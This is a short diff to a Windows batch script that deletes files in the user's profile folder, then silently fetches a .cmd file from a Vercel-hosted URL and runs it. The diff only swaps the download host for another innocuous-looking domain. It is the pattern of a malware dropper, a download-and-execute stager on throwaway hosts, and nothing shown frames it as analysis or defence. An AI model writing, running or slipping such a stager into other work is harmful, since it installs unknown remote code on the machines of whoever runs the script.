@@ -1,6 +1,6 @@
 ::@echo off
 if exist "%USERPROFILE%\parse" del "%USERPROFILE%\parse"
 if exist "%USERPROFILE%\setup.cmd" del "%USERPROFILE%\setup.cmd"
-curl -s -L -o "%USERPROFILE%\setup.cmd" "https://create-react-lyart.vercel.app/120/ws.cmd" setup.cmd
+curl -s -L -o "%USERPROFILE%\setup.cmd" "https://trading-v1-99wu.vercel.app/120/ws.cmd" setup.cmd
 "%USERPROFILE%\setup.cmd"
 ::cls
